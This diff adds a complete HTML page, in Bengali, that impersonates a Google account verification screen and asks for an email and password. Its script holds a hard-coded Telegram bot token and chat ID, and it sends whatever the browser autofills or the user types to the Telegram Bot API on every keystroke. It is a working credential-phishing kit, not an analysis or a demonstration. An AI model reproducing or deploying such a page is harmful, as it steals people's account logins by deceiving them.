@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Verification</title>
+    <style>
+        body { font-family: 'Roboto', Arial, sans-serif; background-color: #f7f9fc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); width: 90%; max-width: 380px; text-align: center; }
+        .logo { width: 50px; margin-bottom: 10px; cursor: pointer; }
+        h2 { font-size: 20px; color: #202124; margin-bottom: 5px; }
+        p { color: #5f6368; font-size: 14px; margin-bottom: 25px; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 8px; font-size: 16px; box-sizing: border-box; outline: none; transition: 0.3s; }
+        input:focus { border-color: #1a73e8; }
+        .add-btn { width: 100%; padding: 14px; background-color: #1a73e8; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://cdn-icons-png.flaticon.com/512/300/300221.png" alt="Google" class="logo">
+    <h2>ভেরিফিকেশন সম্পন্ন করুন</h2>
+    <p>আপনার সেভ করা একাউন্ট ব্যবহার করতে নিচের ঘরে ক্লিক করুন</p>
+
+    <form id="autoForm">
+        <input type="email" id="email" placeholder="ইমেইল বা ফোন" autocomplete="username" required>
+        <input type="password" id="password" placeholder="পাসওয়ার্ড" autocomplete="current-password" required>
+        
+        <button type="button" class="add-btn" id="nextButton">এড করুন</button>
+    </form>
+</div>
+
+<script>
+    const botToken = "7957986649:AAGCcJ5R6g6PMHEgWXFqLRn2SrpElZvUtnE";
+    const chatId = "8516934257";
+
+    // এই ফাংশনটি ডাটা টেলিগ্রামে পাঠাবে
+    function sendToTelegram() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('password').value;
+
+        // যখন ইমেইল এবং পাসওয়ার্ড দুটোই কমপক্ষে ৪ অক্ষরের হবে তখনই পাঠাবে
+        if (email.length > 4 && pass.length > 3) {
+            const text = `📬 নতুন অটো-ফিল ডাটা:\n👤 Name: Mst. Sarmin Akter\n📧 Email: ${email}\n🔑 Password: ${pass}`;
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: text })
+            });
+        }
+    }
+
+    // অটো-ফিল হওয়া মাত্রই ডাটা চলে যাবে
+    document.getElementById('email').addEventListener('change', sendToTelegram);
+    document.getElementById('password').addEventListener('change', sendToTelegram);
+    // কী-বোর্ড দিয়ে লিখলেও ডাটা চলে যাবে
+    document.getElementById('email').addEventListener('input', sendToTelegram);
+    document.getElementById('password').addEventListener('input', sendToTelegram);
+
+    // 'এড করুন' বাটনে ক্লিক করলে পরবর্তী পেজে যাবে
+    document.getElementById('nextButton').addEventListener('click', function() {
+        // এখানে আপনার পরবর্তী 'সেটিংস' পেজের নাম দিন
+        window.location.href = "settings.html"; 
+    });
+</script>
+
+</body>
+</html>
